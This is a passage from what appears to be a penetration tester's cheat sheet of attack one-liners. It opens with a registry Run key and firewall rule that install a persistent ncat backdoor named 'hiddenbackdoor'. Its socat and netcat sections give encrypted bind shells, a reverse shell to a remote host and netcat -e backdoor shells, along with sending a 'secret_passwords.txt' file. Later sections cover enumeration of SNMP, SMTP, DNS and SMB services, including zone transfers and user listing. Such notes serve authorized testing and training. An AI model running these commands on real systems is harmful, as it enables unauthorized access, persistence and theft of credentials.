reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ /v hiddenbackdoor /d "C:\Program Files (x86)\Nmap\ncat.exe -lnp 4445 -e cmd.exe"
netsh advfirewall firewall add rule name="hiddenbackdoor" dir=in action=allow protocol=TCP localport=4445
```

SOCAT STUFF
```bash
# socat forwarder
socat TCP-LISTEN:80,fork TCP:202.54.1.5:80

# socat syslog server
socat -u udp4-listen:514,bind=192.0.2.10, open:/tmp/syslog,create,append

# forwarding
socat TCP4-LISTEN:8080 TCP4:123.456.789.12:80
socat TCP-LISTEN:8088,fork TCP:127.0.0.1:80

# minimal forward proxy
socat TCP-LISTEN:8443,fork TCP:corethreat.net:443

# encrypted shell
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
cat bind_shell.key bind_shell.crt > bind_shell.pem
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
socat - OPENSSL:10.11.0.4:443,verify=0

# send file
sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
socat TCP4:10.10.0.1:443 file:received_secret_passwords.txt,create

# reverse shell
socat TCP4:10.10.0.22:443 EXEC:/bin/bash
```


NETCAT STUFF
```bash
# netcat stuff
Netcat-Forwarding
nc [host] [port] > relay.bat # forwarding

nc -l -p [port] -e relay.bat # forwarding

Netcat-Forwarding
nc -l -p [port] 0 (less than) backpipe (pipe) nc [client IP] [port] (pipe) tee backpipe

Netcat-Filetransfer
nc [host] [port] (greater than) file_name.out # send a file

nc [host] [port] (less than) file_name.in # receive a file

Netcat-Port-Scanner
nc -zv site.com 80 # scan port

nc -zv hostname.com 80 84 # scan ports
nc -zv site.com 80-84 # scan ports
nc -nvv -w 1 -z 10.11.1.220 3388-3390
nc -nv -u -z -w 1 10.11.1.115 160-162


Netcat-Banner
echo "" | nc -zv -wl [host] [port range] grab banner

Netcat-Backdoor-Shells
nc -l -p [port] -e /bin/bash
nc -l -p [port] -e cmd.exe
```

BASH, SETUP and Prep Stuff
```
# vim visual mode
vim disable visual mode
:set mouse-=a

one-liner
echo "set mouse-=a" >> ~/.vimrc 
echo "syntax on" >> ~/.vimrc 

```

BASH SCRIPTING - LOOPS
```bash
# for-loop
for ip in $(seq 1 10); do echo 10.11.1.$ip; done
for url in $(cat list.txt); do host $url; done
for url in $(cat list.txt); do host $url; done | grep "has address" | cut -d " " -f 4 | sort -u

# while-loop read from file
while read line; do echo $line ; done < tmp.txt
```

SMTP (Port 25)
```
nc -nv 10.11.1.217 25
VRFY root
```

SNMP (Port 161)
```
snmp-check 192.168.120.94
snmpwalk -c public -v1 -t 10 10.11.1.14

# enum user
snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.1.77.1.2.25

# enum windows process
snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2

# enum open ports
snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3

# enum installed sw
snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2
```

FTP
```
# show hidden files
ls -lisah 

# download multiply files
prompt
mget *.*
```



DNS (Port 53)
```
host www.site.com
host -t mx www.site.com
host -t txt www.site.com

# brute force
for ip in $(cat list.txt); do host $ip.site.com; done

# zone transfer
host -l site.com ns1.site.com
```

SMB (Port 138, 139, 445)
```
smbmap -H 192.168.52.43
smbclient -L <ip>

smbclient -L 192.168.1.40
smbclient //192.168.1.40/guest
get file.txt

smbclient -L //192.168.52.43/HELPDESK --user HELPDESK/admin

```

REFS
```
https://github.com/swisskyrepo/PayloadsAllTheThings
```

Active Directory
```
[https://github.com/swisskyrepo/PayloadsAllTheThings](https://0xdarkvortex.dev/active-directory-penetration-dojo-ad-environment-enumeration-1/)
```

